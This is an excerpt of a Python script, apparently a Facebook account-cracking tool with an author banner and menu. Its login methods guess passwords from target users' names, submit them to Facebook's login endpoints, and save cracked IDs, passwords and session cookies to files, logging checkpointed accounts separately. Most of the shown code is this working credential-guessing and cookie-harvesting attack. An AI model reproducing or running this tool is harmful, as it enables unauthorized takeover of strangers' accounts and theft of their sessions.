...
\_/\_\\____/\____/\____/\____/         
 ...
 ____ ___  _ ____  _____ ____  ____  _ 
/   _\\  \///  _ \/  __//  __\/ _  \/ \
|  /   \  / | | //|  \  |  \/|\/ | || |
|  \__ / /  | |_\\|  /_ |    /   | || |
\____//_/   \____/\____\\_/\_\   \_/\_/
\033[1;37m------------------------------------------------
\033[1;37m Owner   :            Rojob Ali
\033[1;37m Facebook:            Rojob Ali
\033[1;37m Github  :            rb-rojob
...
def Rojob():   
    ...
    if select =='1':
       ...
       cutter()
        ...
        os.system('xdg-open https://www.facebook.com/profile.php?id=100009218095156')
        pass
    elif select =='F':
        os.system('xdg-open https://www.facebook.com/profile.php?id=100009218095156/')
    else:
...
class main_crack():
    ...
    def methodA(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ROJOB] {loop} | M1 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
                ...
                if 'session_key' in q:
                    ckkk = ";".join(i["name"]+"="+i["value"] for i in q["session_cookies"]);ssbb = base64.b64encode(os.urandom(18)).decode().replace("=","").replace("+","_").replace("/","-");cookie = f"sb={ssbb};{ckkk}"
                    print(f"\r{R} [ROJOB-OK] {sid} | {ps} {S}")
                    oks.append(sid)
                    open('/sdcard/ROJOB_OK_ids_M2.txt','a').write(sid+'|'+ps+'\n');open('/sdcard/SSB_iDs_COOKiEs_M2.txt','a').write(sid+'|'+ps+'|'+cookie+'\n')
                    break
                elif 'www.facebook.com' in q['error']['message']:
                    #  print(f"\r{A} [ROJOB-CP] {sid} | {ps} {S}")
                    cps.append(sid)
                    open('/sdcard/SSB_CP.txt','a').write(sid+'|'+ps+'\n')
                else:
                    continue
    ...
    def methodB(self, sid, name, psw):
        try:
            global oks,cps,loop
            sys.stdout.write(f"\r {S}[ROJOB] {loop} | M2 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
            sys.stdout.flush()
            fs = name.split(' ')[0]
            try:
                ls = name.split(' ')[1]
...
'x-fb-connection-token': 'd29d67d37eca387482a8a5b740f84f62',}
    ...
    def methodD(self, sid, name, psw):
        global oks,cps,loop
        sys.stdout.write(f"\r {S}[ROJOB] {loop} | M4 OK/CP {len(oks)}/{len(cps)} | {S}{'{:.0%}'.format(loop/float(len(self.id)))}{S}")
        sys.stdout.flush()
        fs = name.split(' ')[0]
        try:
            ls = name.split(' ')[1]
...
def cutter():
    ...
    os.system('touch ' +rojob)
    os.system('sort -r '+ssb+' | uniq > '+rojob)
    os.system('clear')
    print(logo)
    print("Removed Successful From File : " + rojob )
    print(47*'-')
    print("File Saved To :" + rojob )
    print(47*'-')
    input(f"{S} Press Enter To Back ROJOB Menu ")
    menu
...
def p_dump():
    ...
    try:
        ...
        print(f"File Saved To  {filepath} ")
        print(47*'-')
        input("Press enter to back ROJOB Menu ")
        ROJOB(allkey)
    except Exception as e:
        print("Error : %s"%e) 
